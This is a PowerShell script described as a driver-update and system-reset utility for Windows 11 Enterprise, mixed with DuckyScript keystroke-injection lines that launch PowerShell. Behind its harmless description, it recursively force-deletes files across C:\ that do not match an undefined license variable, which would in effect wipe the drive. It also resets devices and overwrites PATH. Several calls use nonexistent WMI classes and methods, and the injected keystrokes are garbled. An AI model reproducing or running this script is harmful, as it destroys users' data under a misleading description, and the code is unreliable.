<#
.SYNOPSIS
This script updates the drivers of the default network device, deletes files not associated with the current product license, resets all device configurations to their default values, removes any path variables not associated with the current product license, checks the firewall rules, and sets the update policy.

.DESCRIPTION
This script is only for Windows 11 Enterprise systems. It gets the list of network hardware, prompts the user to select their default device, gets the manufacturer and PnP device ID of the selected device, checks for available updates for the OEM drivers, installs the updates, deletes any files that are not associated with the current product license, resets all device configurations to their default values, removes any path variables that are not associated with the current product license, checks the firewall rules, and sets the update policy.

.PARAMETER None
This script does not accept any parameters.

.EXAMPLE
.\defaultWin11OS.ps1
Runs the script to update the drivers of the default network device, delete files not associated with the current product license, reset all device configurations to their default values, remove any path variables not associated with the current product license, check the firewall rules, and set the update policy.
.NOTES
This script requires administrative privileges to run.
#>

GUI r
DELAY 500
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 500
STRING # Check the operating system version

DELAY 500
STRING $current_os = (Get-WmiObject Win32_OperatingSystem).Caption
ENTER


$current_os = (Get-WmiObject Win32_OperatingSystem).Caption
if ($current_os -ne "Microsoft Windows 11 Enterprise") {
    Write-Host "This script is only for Windows 11 Enterprise systems."
    exit
}

# Get the list of network hardware
Get-WmiObject Win32_NetworkAdapter | Select-Object Name, Manufacturer, PnPDeviceID | Out-File -FilePath "hardware.txt"

# Prompt the user to select their default device
Write-Host "Please select your default network device from the following list:"
Get-Content "hardware.txt"
$device = Read-Host "Enter the name of your default device"

# Get the manufacturer and PnP device ID of the selected device
Get-Content "hardware.txt" | ForEach-Object {
  if ($_ -match "^$device\s+(.+)\s+(.+)$") {
    $manufacturer = $matches[1]
    $pnpdeviceid = $matches[2].Substring(1, $matches[2].Length - 2)
  }
}

# Check for available updates for the OEM drivers
Get-WmiObject -Namespace "root\wmi" -Query "SELECT * FROM MS_DRIVER_PROVIDER_WMI_Provider WHERE PNPDeviceID='$pnpdeviceid' AND Manufacturer='$manufacturer'" | ForEach-Object {
  $_.CheckForUpdates(0, 1)
}

# Install the updates
Get-WmiObject -Namespace "root\wmi" -Query "SELECT * FROM MS_DRIVER_PROVIDER_WMI_Provider WHERE PNPDeviceID='$pnpdeviceid' AND Manufacturer='$manufacturer'" | ForEach-Object {
  $_.InstallUpdates(0, 1)
}

# Delete any files that are not associated with the current product license
Get-ChildItem -Path "C:\*" -Recurse -File | Where-Object {
  $_.FullName -notmatch $license
} | ForEach-Object {
  Write-Host "Deleting file: $_"
  Remove-Item -Path $_.FullName -Force
}

# Reset all device configurations to their default values
& wmic device call reset

# Remove any path variables that are not associated with the current product license
$env:path = "$env:SystemRoot\system32;$env:SystemRoot;$env:SystemRoot\System32\Wbem"

# Check the firewall rules
# (replace with appropriate code)

# Set the update policy
$key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate", $true)
$key.SetValue("ElevateNonAdmins", 0, [Microsoft.Win32.RegistryValueKind]::DWord)
$key.SetValue("DeferFeatureUpdates", 1, [Microsoft.Win32.RegistryValueKind]::DWord)
$key.Close()

Write-Host "Done."
ENTER

$OS = (Get-WmiObject -Class Win32_OperatingSystem).Caption
Write-Host "Operating System: $OS"


